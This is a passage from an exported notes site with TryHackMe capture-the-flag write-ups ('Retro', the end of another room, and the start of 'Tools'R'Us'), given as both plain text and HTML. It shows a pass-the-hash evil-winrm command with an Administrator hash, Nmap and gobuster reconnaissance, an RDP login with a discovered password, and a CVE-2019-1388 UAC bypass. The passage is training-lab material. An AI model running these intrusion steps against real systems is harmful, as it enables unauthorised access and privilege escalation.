class=&quot;external&quot; target=&quot;_blank&quot;&gt;passing the hash&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;evil-winrm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --ip&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10.10.177.198&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --user&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; Administrator&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;           --hash&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; 0e0363213e37b94221497260b0bcb4fc&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The final flag is in a file called root.txt on the Administrator account’s desktop.&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;Elapsed Time:&lt;/strong&gt; 2 h 38 min&lt;/p&gt;","rssInclude":true},"journals/2022-01-02":{"slug":"journals/2022-01-02","filePath":"journals/2022-01-02.md","title":"Retro","links":["journals/2021-12-08","spells/Nmap","spells/gobuster","spells/XFreeRDP"],"tags":["Journal/Tale"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\n“Retro” on TryHackMe\n\n\n\nInitial reconnaissance\nThis CTF is an earlier version of Blaster without the step-by-step nature of that room. Not 100% sure what the differences are.\nThe target IP is 10.10.20.185.\nAs with Blaster, we’ll start out by running an Nmap scan:\nsudo nmap -v -oA retro -Pn -A -T4 -sS -script vuln \\\n          -p- 10.10.20.185\nThis gives us:\n# Nmap 7.92 scan initiated Sun Jan  2 19:34:48 2022 as: nmap -v -oA retro -Pn -A -T4 -sS -script vuln -p- 10.10.20.185\nPre-scan script results:\n|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)\nNmap scan report for 10.10.20.185\nHost is up (0.18s latency).\nNot shown: 65533 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n80/tcp   open  http          Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.\n|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.\n|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2012|2016 (90%), FreeBSD 6.X (85%)\nOS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:freebsd:freebsd:6.2\nAggressive OS guesses: Microsoft Windows Server 2012 R2 (90%), Microsoft Windows Server 2016 (89%), FreeBSD 6.2-RELEASE (85%)\nNo exact OS matches for host (test conditions non-ideal).\nUptime guess: 0.013 days (since Sun Jan  2 19:29:09 2022)\nNetwork Distance: 4 hops\nTCP Sequence Prediction: Difficulty=261 (Good luck!)\nIP ID Sequence Generation: Incremental\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   37.05 ms  10.13.0.1\n2   ... 3\n4   180.52 ms 10.10.20.185\n\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at nmap.org/submit/ .\n# Nmap done at Sun Jan  2 19:47:21 2022 -- 1 IP address (1 host up) scanned in 753.31 seconds\n\nSo we’ve got IIS and RDP running. Let’s start by taking a look around IIS.\nFlag 1: The hidden directory\nAs with Blaster, we just have the default IIS welcome page. So let’s follow up with gobuster since we know from the flag list that there’s a hidden directory.\ngobuster \\\n\t-t 10 dir \\\n\t-w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \\\n\t-u http://10.10.20.185/\nFlag 2: user.txt\nVisiting the hidden directory reveals the same retro arcade website as Blaster. (I’m noticing a parallel here… I suspect that the rest of the CTF will also be the same, though I’m going to see if I can do this one with less guessing.)\nAll of the posts are by “Wade”. I hadn’t noticed it the first time, but the “Ready Player One” post is actually suggestive that either Wade’s username or password is “Parzival”.\n\nI can’t believe the movie based on my favorite book of all time is going to come out in a few days! Maybe it’s because my name is so similar to the main character, but I honestly feel a deep connection to the main character Wade. I keep mistyping the name of his avatar whenever I log in but I think I’ll eventually get it down. Either way, I’m really excited to see this movie!\n\nThe comment immediately afterward seems to confirm this.\n\nLeaving myself a note here just in case I forget how to spell it: parzival\n\nTheoretically I should use this information to generate a wordlist (who knows what permutations Wade is applying to “Parzival”, and whether this is Wade’s username or password). There’s a few Kali Linux tools that could be used to harvest words from the hidden site and generate various common permutations, but all of these will result in quite a long list.\nIn the real world, this is what I’d probably have to do. But since I kinda already know how this is going to shake out, let’s just skip ahead to logging in with XFreeRDP.\nxfreerdp /dynamic-resolution +clipboard /cert:ignore \\\n         /v:10.10.20.185 /u:Wade /p:parzival\nUnsurprisingly, this works. The user.txt file on the desktop contains the second flag (which is different than in Blaster!).\nFlag 3: root.txt\nThis flag is probably in C:\\Users\\Administrator\\Desktop\\root.txt. But now things are diverging a bit…\nWade has Google Chrome installed in this version of the CTF, and no other files are on the desktop.\nBut poking around a bit reveals that things aren’t too far off Blaster.\n\nThere’s an hhupd.exe executable in the Recycle Bin.\nChrome has a single bookmark for “NVD — CVE-2019-1388”.\n\nOf course, the TryHackMe machine doesn’t have internet access, but we can follow this link locally. Moreover, searching for hhupd reveals that this is a program that can be used to perform the attack; that page helpfully links to a YouTube video demonstrating how to leverage hhupd.exe in exactly this way.\nThe attack works somewhat differently on this system than in Blaster (or the demonstration video), however. Instead of opening up an Internet Explorer window outside of the secure desktop, IE is opened up on the UAC desktop itself, and all interaction needs to take place there (we also get a choice of using IE or Chrome…). Still, overall things work more-or-less as we’d expect, and we can use the resulting elevated command prompt to read C:\\Users\\Administrator\\Desktop\\root.txt.txt (note the extra .txt) to obtain the final flag.\n(I kinda feel like I cheated now, since I did Blaster first without realizing that this room was almost exactly the same.)\nElapsed Time: 1 h 16 min","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/retro&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;“Retro” on TryHackMe&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;h2 id=&quot;initial-reconnaissance&quot;&gt;Initial reconnaissance&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#initial-reconnaissance&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;This CTF is an earlier version of &lt;a href=&quot;https://cardboard-iguana.com/grimoire/journals/2021-12-08&quot; class=&quot;internal alias&quot; data-slug=&quot;journals/2021-12-08&quot;&gt;Blaster&lt;/a&gt; without the step-by-step nature of that room. Not 100% sure what the differences are.&lt;/p&gt;\n&lt;p&gt;The target IP is 10.10.20.185.&lt;/p&gt;\n&lt;p&gt;As with Blaster, we’ll start out by running an &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nmap&quot;&gt;Nmap&lt;/a&gt; scan:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -oA&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; retro&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -Pn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -T4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -sS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; vuln&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;          -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10.10.20.185&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This gives us:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Sun Jan  2 19:34:48 2022 as: nmap -v -oA retro -Pn -A -T4 -sS -script vuln -p- 10.10.20.185\nPre-scan script results:\n|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)\nNmap scan report for 10.10.20.185\nHost is up (0.18s latency).\nNot shown: 65533 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n80/tcp   open  http          Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.\n|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.\n|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2012|2016 (90%), FreeBSD 6.X (85%)\nOS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:freebsd:freebsd:6.2\nAggressive OS guesses: Microsoft Windows Server 2012 R2 (90%), Microsoft Windows Server 2016 (89%), FreeBSD 6.2-RELEASE (85%)\nNo exact OS matches for host (test conditions non-ideal).\nUptime guess: 0.013 days (since Sun Jan  2 19:29:09 2022)\nNetwork Distance: 4 hops\nTCP Sequence Prediction: Difficulty=261 (Good luck!)\nIP ID Sequence Generation: Incremental\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   37.05 ms  10.13.0.1\n2   ... 3\n4   180.52 ms 10.10.20.185\n\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Sun Jan  2 19:47:21 2022 -- 1 IP address (1 host up) scanned in 753.31 seconds\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;So we’ve got IIS and RDP running. Let’s start by taking a look around IIS.&lt;/p&gt;\n&lt;h2 id=&quot;flag-1-the-hidden-directory&quot;&gt;Flag 1: The hidden directory&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#flag-1-the-hidden-directory&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;As with Blaster, we just have the default IIS welcome page. So let’s follow up with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/gobuster&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/gobuster&quot;&gt;gobuster&lt;/a&gt; since we know from the flag list that there’s a hidden directory.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;gobuster&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; dir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-w&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; http://10.10.20.185/&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;flag-2-usertxt&quot;&gt;Flag 2: user.txt&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#flag-2-usertxt&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Visiting the hidden directory reveals the same retro arcade website as Blaster. (I’m noticing a parallel here… I suspect that the rest of the CTF will also be the same, though I’m going to see if I can do this one with less guessing.)&lt;/p&gt;\n&lt;p&gt;All of the posts are by “Wade”. I hadn’t noticed it the first time, but the “&lt;a href=&quot;https://en.wikipedia.org/wiki/Ready_Player_One&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Ready Player One&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;” post is actually suggestive that either Wade’s username or password is “Parzival”.&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;I can’t believe the movie based on my favorite book of all time is going to come out in a few days! Maybe it’s because my name is so similar to the main character, but I honestly feel a deep connection to the main character Wade. I keep mistyping the name of his avatar whenever I log in but I think I’ll eventually get it down. Either way, I’m really excited to see this movie!&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;The comment immediately afterward seems to confirm this.&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;Leaving myself a note here just in case I forget how to spell it: parzival&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;Theoretically I should use this information to generate a wordlist (who knows what permutations Wade is applying to “Parzival”, and whether this is Wade’s username or password). There’s a few Kali Linux tools that could be used to harvest words from the hidden site and generate various common permutations, but all of these will result in quite a long list.&lt;/p&gt;\n&lt;p&gt;In the real world, this is what I’d probably have to do. But since I kinda already know how this is going to shake out, let’s just skip ahead to logging in with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/XFreeRDP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/XFreeRDP&quot;&gt;XFreeRDP&lt;/a&gt;.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;xfreerdp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /dynamic-resolution&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; +clipboard&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /cert:ignore&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;         /v:10.10.20.185&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /u:Wade&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /p:parzival&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Unsurprisingly, this works. The user.txt file on the desktop contains the second flag (which is different than in Blaster!).&lt;/p&gt;\n&lt;h2 id=&quot;flag-3-roottxt&quot;&gt;Flag 3: root.txt&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#flag-3-roottxt&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;This flag is probably in &lt;code&gt;C:\\Users\\Administrator\\Desktop\\root.txt&lt;/code&gt;. But now things are diverging a bit…&lt;/p&gt;\n&lt;p&gt;Wade has Google Chrome installed in this version of the CTF, and no other files are on the desktop.&lt;/p&gt;\n&lt;p&gt;But poking around a bit reveals that things aren’t too far off Blaster.&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;There’s an hhupd.exe executable in the Recycle Bin.&lt;/li&gt;\n&lt;li&gt;Chrome has a single bookmark for “&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2019-1388&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;NVD — CVE-2019-1388&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;”.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Of course, the TryHackMe machine doesn’t have internet access, but we can follow this link locally. Moreover, searching for hhupd reveals that &lt;a href=&quot;https://www.nagenrauft-consulting.com/2019/11/21/cve-2019-1388-hhupd-exe/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;this is a program that can be used to perform the attack&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;; that page helpfully links to &lt;a href=&quot;https://www.youtube.com/watch?v=3BQKpPNlTSo&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;a YouTube video demonstrating how to leverage hhupd.exe in exactly this way&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;p&gt;The attack works somewhat differently on this system than in Blaster (or the demonstration video), however. Instead of opening up an Internet Explorer window outside of the secure desktop, IE is opened up &lt;em&gt;on&lt;/em&gt; the UAC desktop itself, and all interaction needs to take place there (we also get a choice of using IE or Chrome…). Still, overall things work more-or-less as we’d expect, and we can use the resulting elevated command prompt to read &lt;code&gt;C:\\Users\\Administrator\\Desktop\\root.txt.txt&lt;/code&gt; (note the extra .txt) to obtain the final flag.&lt;/p&gt;\n&lt;p&gt;(I kinda feel like I cheated now, since I did Blaster first without realizing that this room was almost &lt;em&gt;exactly&lt;/em&gt; the same.)&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;Elapsed Time:&lt;/strong&gt; 1 h 16 min&lt;/p&gt;","rssInclude":true},"journals/2022-01-30":{"slug":"journals/2022-01-30","filePath":"journals/2022-01-30.md","title":"Tools‘R’Us","links":["spells/Hydra","spells/Nmap","spells/Nikto","spells/gobuster","spells/meterpreter"],"tags":["Journal/Tale"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\n“Tools‘R’Us” on TryHackMe\n\n\n\nWe’re supposed to restrict ourselves to the following tools in this CTF:\n\ndirbuster\nHydra\nNmap\nNikto\nMetasploit\n\nIt’s been a little while since I had the chance to use some of these, so let’s find out how rusty I am!\nNarrative\nThe target is at 10.10.28.154. Visiting http://10.10.28.154 reveals a “down for maintenance” page with no other links, but with the cryptic promise that “[o]ther parts of the website is [sic] still functional…”\nWe’ll start off with an Nmap scan.\nsudo nmap -v -oA tools-r-us -Pn -A -T4 -sS -script vuln \\\n          -p- 10.10.28.154\nThis gives the following output:\n# Nmap 7.92 scan initiated Sun Jan 30 15:52:33 2022 as: nmap -v -oA tools-r-us -Pn -A -T4 -sS -script vuln -p- 10.10.28.154\nPre-scan script results:\n|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)\nNmap scan report for 10.10.28.154\nHost is up (0.17s latency).\nNot shown: 65531 closed tcp ports (reset)\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| vulners: \n|   cpe:/a:openbsd:openssh:7.2p2: \n|     \tPACKETSTORM:140070\t7.8\tvulners.com/packetstorm/PACKETSTORM:140070\t*EXPLOIT*\n|     \tEXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09\t7.8\tvulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09\t*EXPLOIT*\n|     \tEDB-ID:40888\t7.8\tvulners.com/exploitdb/EDB-ID:40888\t*EXPLOIT*\n|     \tCVE-2016-8858\t7.8\tvulners.com/cve/CVE-2016-8858\n|     \tCVE-2016-6515\t7.8\tvulners.com/cve/CVE-2016-6515\n|     \t1337DAY-ID-26494\t7.8\tvulners.com/zdt/1337DAY-ID-26494\t*EXPLOIT*\n|     \tSSV:92579\t7.5\tvulners.com/seebug/SSV:92579\t*EXPLOIT*\n|     \tCVE-2016-10009\t7.5\tvulners.com/cve/CVE-2016-10009\n|     \t1337DAY-ID-26576\t7.5\tvulners.com/zdt/1337DAY-ID-26576\t*EXPLOIT*\n|     \tSSV:92582\t7.2\tvulners.com/seebug/SSV:92582\t*EXPLOIT*\n|     \tCVE-2016-10012\t7.2\tvulners.com/cve/CVE-2016-10012\n|     \tCVE-2015-8325\t7.2\tvulners.com/cve/CVE-2015-8325\n|     \tSSV:92580\t6.9\tvulners.com/seebug/SSV:92580\t*EXPLOIT*\n|     \tCVE-2016-10010\t6.9\tvulners.com/cve/CVE-2016-10010\n|     \t1337DAY-ID-26577\t6.9\tvulners.com/zdt/1337DAY-ID-26577\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/\t*EXPLOIT*\n|     